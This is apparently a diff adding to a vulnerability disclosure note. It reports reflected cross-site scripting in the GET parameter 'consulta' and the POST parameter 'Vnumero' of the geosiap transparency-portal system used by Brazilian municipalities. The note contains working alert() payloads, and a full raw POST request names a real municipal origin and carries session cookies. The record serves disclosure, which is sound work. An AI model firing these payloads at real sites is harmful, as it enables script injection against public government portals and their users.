@@ -1,3 +1,31 @@
 The parameter via get with xss vulnerability ?consulta= was found on several sites of the geosiap system on the transparency portal.
 
 https://teste.teste.net.br/xxxx/websis/portal_transparencia/financeiro/contas_publicas/?consulta=asd%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+
+
+It was found on several sites of the geosiap system on the transparency portal, the parameter via post with xss vulnerability Vnumero=
+
+POST /xxx/websis/siapegov/legislativo/leis/resulta_leis.php HTTP/1.1
+Host: xxxx.geosiap.net.br
+Cookie: pmpinda=p3cco4u0lfj0u0bkedh3ie41sn; pmpindafundo=ckek0bln43m9uoi6etfvijaq92; pmpinda_siapnet=45301ebf37334e48d798a6b5337e264f
+Content-Length: 188
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: pt-BR,pt;q=0.9
+Upgrade-Insecure-Requests: 1
+Origin: https://siapegov.pindamonhangaba.sp.gov.br
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://xxxx.geosiap.net.br/xxxx/websis/siapegov/legislativo/leis/consulta_leis.php
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+
+Vcategoria=05&Vnumero=asd"></script><script>alert(1)</script><asd>&Vano=0&Vementa=&Vautor=&paginacao=50&tipo_ordenacao=promulgacao&forma_ordenacao=desc&cliente=pmpinda&Pesquisar2=Pesquisar
